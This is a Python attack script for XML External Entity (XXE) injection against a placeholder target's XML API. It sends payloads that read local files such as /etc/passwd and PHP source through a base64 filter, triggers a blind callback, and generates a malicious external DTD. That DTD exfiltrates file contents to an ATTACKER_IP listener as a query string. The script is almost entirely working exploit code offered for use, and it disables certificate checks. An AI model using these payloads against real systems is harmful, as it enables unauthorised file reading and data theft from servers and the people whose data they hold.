#!/usr/bin/env python3
"""XXE (XML External Entity): local file read, in-band and out-of-band (blind)
exfiltration, plus the external DTD you host on your own server for the OOB
case. Replace ATTACKER_IP with your listener host."""

import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://target.local"
ATTACKER_IP = "ATTACKER_IP"
XML_ENDPOINT = "/api/xml"


def xxe_file_read(file_path: str = "/etc/passwd") -> str:
    """In-band XXE: define an entity pointing at a local file and reference it
    where the response reflects parsed content."""
    body = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}">]>
<foo>&xxe;</foo>"""
    r = requests.post(f"{BASE_URL}{XML_ENDPOINT}", data=body,
                      headers={"Content-Type": "application/xml"},
                      verify=False, timeout=10)
    print(r.status_code, r.text[:500])
    return r.text


def xxe_php_filter_read(file_path: str = "index.php") -> str:
    """Read a file through the PHP base64 filter wrapper (handles files with
    characters that would otherwise break XML parsing)."""
    body = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">]>
<foo>&xxe;</foo>"""
    r = requests.post(f"{BASE_URL}{XML_ENDPOINT}", data=body,
                      headers={"Content-Type": "application/xml"},
                      verify=False, timeout=10)
    print(r.status_code, r.text[:500])
    return r.text


def xxe_oob_detection() -> str:
    """Blind XXE callback: force the parser to fetch a URL you control and watch
    your listener (python3 -m http.server 8000) for the hit."""
    body = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{ATTACKER_IP}:8000/xxe-hit">]>
<foo>&xxe;</foo>"""
    r = requests.post(f"{BASE_URL}{XML_ENDPOINT}", data=body,
                      headers={"Content-Type": "application/xml"},
                      verify=False, timeout=10)
    print(r.status_code)
    return r.text


def external_dtd_template(file_path: str = "/etc/passwd") -> str:
    """Return the malicious DTD to host at http://ATTACKER_IP:8000/evil.dtd for
    blind OOB exfiltration. It reads a file and sends its contents to your
    listener as a query string. Serve it, then trigger with xxe_oob_exfil()."""
    return f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{ATTACKER_IP}:8000/collect?d=%file;'>">
%eval;
%exfil;"""


def xxe_oob_exfil() -> str:
    """Blind OOB exfiltration: the document pulls your external DTD, which reads
    a file and beacons it back. Host external_dtd_template() at evil.dtd first."""
    body = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://{ATTACKER_IP}:8000/evil.dtd"> %dtd;]>
<foo>bar</foo>"""
    r = requests.post(f"{BASE_URL}{XML_ENDPOINT}", data=body,
                      headers={"Content-Type": "application/xml"},
                      verify=False, timeout=10)
    print(r.status_code)
    return r.text


if __name__ == "__main__":
    pass
